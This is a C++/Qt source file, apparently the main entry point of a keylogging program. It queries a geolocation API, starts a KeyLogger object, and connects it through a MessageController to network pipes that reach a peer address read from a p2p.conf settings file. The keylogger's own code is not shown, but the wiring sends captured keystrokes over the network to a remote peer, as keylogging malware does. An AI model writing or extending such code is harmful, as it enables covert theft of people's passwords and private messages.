#include <QCoreApplication>
#include "Gateway.h"
#include "Global.h"
#include <QSettings>
#include <QDir>
#include "web/HttpManager.h"
#include "web/HttpResponse.h"
#include <QJsonDocument>
#include <QJsonParseError>

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    HttpResponse resp(HttpManager::getPage(QUrl("http://api.sypexgeo.net/")));
    qDebug() << resp.status() << resp.statusMessage() << resp.header("Content-Encoding") << QString::fromUtf8(qUncompress(resp.body().toUtf8()));
    QJsonParseError err;
    QJsonDocument json = QJsonDocument::fromJson(resp.body().toUtf8(), &err);
    if (err.error != QJsonParseError::NoError)
    {
        qDebug() <<"Json parsing error" << err.errorString() <<  "near" << resp.body().mid(err.offset, 5);
    }

    QDir dir(a.applicationDirPath());
    QSettings settings(dir.absoluteFilePath("p2p.conf"), QSettings::IniFormat);

    keyLogger = new KeyLogger(&a);
    pipeController = new PipeController(new Gateway(15065, &a), &a);
    messageController = new MessageController(keyLogger, pipeController, &a);

    //pipeController->addPipe(new Pipe("127.0.0.1"));
    pipeController->addPipe(new Pipe(settings.value("net/connect", "127.0.0.1").toString()));

    int ret = a.exec();

    messageController->terminate();
    pipeController->terminate();
    keyLogger->terminate();

    return ret;
}
